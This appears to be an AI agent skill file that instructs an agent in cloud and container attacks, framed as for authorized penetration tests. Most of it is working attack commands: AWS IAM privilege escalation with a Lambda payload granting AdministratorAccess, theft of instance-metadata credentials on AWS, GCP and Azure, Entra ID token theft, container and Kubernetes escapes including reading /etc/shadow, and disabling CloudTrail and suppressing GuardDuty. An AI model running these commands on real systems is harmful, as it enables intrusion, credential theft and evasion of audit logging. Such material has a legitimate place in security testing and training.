---
name: cloud-attack
description: Cloud and container attack specialist for authorized pentests — covers AWS IAM privilege escalation (24+ paths), Azure/Entra ID attacks (PRT theft, token abuse), GCP service account abuse, IMDS/SSRF-to-cloud-credentials, serverless and storage exploitation, cloud persistence, container escape (privileged/docker.sock/cgroup/runc CVE-2024-21626), Kubernetes attack paths, and CSPM evasion. Use when attacking AWS, Azure, GCP, or container/Kubernetes environments. Triggers on: AWS privilege escalation, azure attack, GCP attack, IMDS SSRF, container escape, kubernetes attack, cloud pentest, IAM escalation, S3 bucket, Entra ID, docker escape.
---

# Skill: cloud-attack

## Trigger

Fire when the task involves:
- AWS IAM privilege escalation enumeration or exploitation
- Azure/Entra ID token abuse, PRT theft, or tenant enumeration
- GCP service account impersonation or metadata abuse
- IMDS/SSRF → cloud credential extraction chain
- S3/GCS/Azure Blob public bucket / presigned URL abuse
- Container escape from privileged container or via docker.sock
- Kubernetes pod-to-cluster-admin escalation
- CloudTrail/audit-log evasion

## Instructions

### Phase 1 — AWS IAM Privilege Escalation

**Enumerate current identity and permissions**
```bash
# Install Pacu (Metasploit of AWS)
git clone https://github.com/RhinoSecurityLabs/pacu
pip3 install -r requirements.txt
python3 pacu.py
# In Pacu:
exec iam__enum_permissions
exec iam__privesc_scan
exec iam__enum_users_roles_policies_groups

# AWS CLI quick check
aws sts get-caller-identity
aws iam get-account-authorization-details --output json > auth-details.json
```

**Key privilege escalation paths (24+)**
```
1. iam:CreatePolicyVersion → create new policy version with * perms
2. iam:SetDefaultPolicyVersion → roll back to permissive version
3. iam:PassRole + lambda:CreateFunction + lambda:InvokeFunction → execute as any role
4. iam:PassRole + ec2:RunInstances → launch instance with privileged role
5. iam:CreateAccessKey → create key for any user
6. iam:CreateLoginProfile → set console password for any user
7. iam:UpdateLoginProfile → change existing console password
8. iam:AttachUserPolicy / iam:AttachGroupPolicy / iam:AttachRolePolicy → attach AdministratorAccess
9. iam:PutUserPolicy / iam:PutGroupPolicy / iam:PutRolePolicy → inline policy injection
10. sts:AssumeRole → assume poorly configured cross-account or same-account role
11. lambda:UpdateFunctionCode → update existing privileged Lambda
12. glue:CreateDevEndpoint → execute code as privileged Glue role
13. cloudformation:CreateStack → create stack that calls iam:CreateAccessKey
14. ec2:AssociateIamInstanceProfile → attach role to running instance
```

```bash
# Exploit path 3 (PassRole + Lambda)
aws lambda create-function \
  --function-name privesc-fn \
  --runtime python3.12 \
  --role arn:aws:iam::ACCOUNT:role/PrivilegedRole \
  --handler lambda_function.lambda_handler \
  --zip-file fileb://payload.zip

# payload.py inside payload.zip:
# import boto3, json
# def lambda_handler(event, context):
#     iam = boto3.client('iam')
#     iam.attach_user_policy(UserName='lowpriv', PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess')
#     return "done"

aws lambda invoke --function-name privesc-fn /dev/stdout
```

### Phase 2 — IMDS/SSRF → Cloud Credentials

```bash
# AWS IMDSv1 (no auth required)
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME

# AWS IMDSv2 (requires token — try both)
TOKEN=$(curl -s -X PUT http://169.254.169.254/latest/api/token \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME

# GCP metadata
curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \
  -H "Metadata-Flavor: Google"

# Azure IMDS
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

# Use stolen credentials
export AWS_ACCESS_KEY_ID=<stolen>
export AWS_SECRET_ACCESS_KEY=<stolen>
export AWS_SESSION_TOKEN=<stolen>
aws sts get-caller-identity
```

### Phase 3 — Azure/Entra ID Attacks

```bash
# ROADtools (nation-state adopted, MITRE S0684)
pip install roadrecon
roadrecon auth -u user@tenant.onmicrosoft.com -p pass
roadrecon gather
roadrecon gui  # Browse tenant: users, groups, apps, service principals

# PRT (Primary Refresh Token) theft (dirkjanm/ROADtools)
# From a joined device — extract PRT from LSA via Mimikatz
# Then derive access tokens for any Azure resource
roadtx gettokens --prt <prt> --prt-sessionkey <key> --resource https://graph.microsoft.com/

# Enumerate with az cli
az login
az account list
az role assignment list --all | jq '.[] | select(.roleDefinitionName == "Owner")'
az ad sp list --all --query '[].{Name:displayName, AppId:appId}'

# BishopFox/cloudfox (attack path mapper)
git clone https://github.com/BishopFox/cloudfox
go build -o cloudfox .
./cloudfox aws -p profile all-checks
./cloudfox azure -t TENANT_ID all-checks
```

### Phase 4 — Container Escape

**Escape ladder (try in order)**
```bash
# 1. Check if privileged
cat /proc/1/status | grep CapEff
# 0000003fffffffff = full capabilities = PRIVILEGED

# 2. Privileged container → mount host filesystem
mkdir /mnt/host && mount /dev/sda1 /mnt/host
chroot /mnt/host bash
# Write SSH key or cron job

# 3. docker.sock exposed
find / -name "docker.sock" 2>/dev/null
docker -H unix:///path/to/docker.sock run -v /:/mnt --rm -it alpine chroot /mnt sh

# 4. cgroup v1 release_agent escape (no privileges, just /sys/fs/cgroup write)
mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
echo "$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd && echo "id > /tmp/output" >> /cmd
chmod a+x /cmd && sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
cat /tmp/output

# 5. runc CVE-2024-21626 (overwrite runc binary via /proc/self/fd)
# Exploit available at: https://github.com/NitroCao/CVE-2024-21626
```

### Phase 5 — Kubernetes Attack Paths

```bash
# Check current permissions
kubectl auth can-i --list
kubectl auth can-i --list --as=system:serviceaccount:default:default

# Get service account token from pod
cat /var/run/secrets/kubernetes.io/serviceaccount/token

# If token has create pods permission → privileged pod escape to node
kubectl run escape --image=alpine --restart=Never --overrides='
{
  "spec": {
    "containers": [{
      "name": "escape",
      "image": "alpine",
      "command": ["nsenter","--mount=/proc/1/ns/mnt","--","sh","-c","cat /etc/shadow"],
      "securityContext": {"privileged": true},
      "volumeMounts": [{"name":"host","mountPath":"/host"}]
    }],
    "volumes": [{"name":"host","hostPath":{"path":"/"}}],
    "hostPID": true
  }
}'

# LukasNiessen/kubernetes-skill integration (KubeShark)
npx skills add LukasNiessen/kubernetes-skill
# Provides: pod security scan, network policy audit, RBAC review

# Attack etcd directly (if exposed)
ETCDCTL_API=3 etcdctl --endpoints=http://MASTER_IP:2379 get / --prefix --keys-only | grep secrets
```

### Phase 6 — S3 / Storage Exploitation

```bash
# Find public buckets (prowler)
pip install prowler
prowler aws -c s3_bucket_public_access_block_enabled s3_bucket_no_public_acl

# Check bucket ACL manually
aws s3 ls s3://bucket-name --no-sign-request
aws s3 cp s3://bucket-name/ . --recursive --no-sign-request

# Enumerate buckets via virtual-hosted style (enumerate subdomains)
# target-name.s3.amazonaws.com / target-name.s3.us-east-1.amazonaws.com

# CloudFox (find all public/misconfigured storage)
./cloudfox aws -p profile filesystems
./cloudfox aws -p profile buckets
```

### Phase 7 — Cloud Audit-Log Evasion

```bash
# AWS CloudTrail — low-noise technique
# Use read-only APIs where possible (List*, Get*, Describe* — not always logged)
# Target: sts:GetCallerIdentity, iam:SimulatePrincipalPolicy (always logged but low-alert)

# Disable CloudTrail (requires cloudtrail:StopLogging — noisy but decisive)
aws cloudtrail stop-logging --name <trail-name>

# GuardDuty suppression via resource tags (some orgs suppress tagged resources)
aws ec2 create-tags --resources i-xxx --tags Key=GuardDutyExclude,Value=true

# Prowler for misconfigured logging (blue team use)
prowler aws -c cloudtrail_multi_region_enabled guardduty_is_enabled
```

## References

- RhinoSecurityLabs/pacu — https://github.com/RhinoSecurityLabs/pacu (4,200 stars, BSD-3)
- BishopFox/cloudfox — https://github.com/BishopFox/cloudfox (2,400 stars, Apache-2.0)
- dirkjanm/ROADtools — https://github.com/dirkjanm/ROADtools (MIT)
- prowler-cloud/prowler — https://github.com/prowler-cloud/prowler (14k stars)
- hypnguyen1209/offensive-claude container-k8s-escape — https://github.com/hypnguyen1209/offensive-claude (MIT)
- NitroCao/CVE-2024-21626 — runc escape PoC
- mohamednaeem92-max/OPENCODE-6-2026 aws-penetration-testing — (MIT)
- mukul975/Anthropic-Cybersecurity-Skills — https://github.com/mukul975/Anthropic-Cybersecurity-Skills (Apache-2.0)
- Source report: cloud-conqueror-deep-research-2026-10-27.md